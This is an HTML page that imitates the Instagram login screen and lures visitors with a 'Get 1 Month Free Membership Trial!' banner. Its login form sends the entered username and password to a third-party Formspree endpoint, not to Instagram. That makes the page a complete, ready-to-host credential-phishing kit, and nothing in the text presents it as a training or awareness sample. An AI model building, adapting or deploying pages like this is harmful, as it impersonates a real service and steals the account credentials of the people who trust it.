<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      width: 350px;
      padding: 40px;
      background-color: white;
      border: 1px solid #dbdbdb;
      text-align: center;
    }
    .note {
      color: #3897f0;
      font-weight: bold;
      margin-bottom: 20px;
    }
    .logo {
      font-family: 'Courier New', Courier, monospace;
      font-size: 32px;
      margin-bottom: 20px;
      color: #262626;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      border: none;
      color: white;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }
    .footer {
      margin-top: 20px;
      font-size: 14px;
    }
    .footer a {
      color: #3897f0;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="note">Get 1 Month Free Membership Trial!</div>
    <div class="logo">Instagram</div>
    <form action="https://formspree.io/f/mldbkqvk" method="POST">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="footer">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>
</body>
</html>
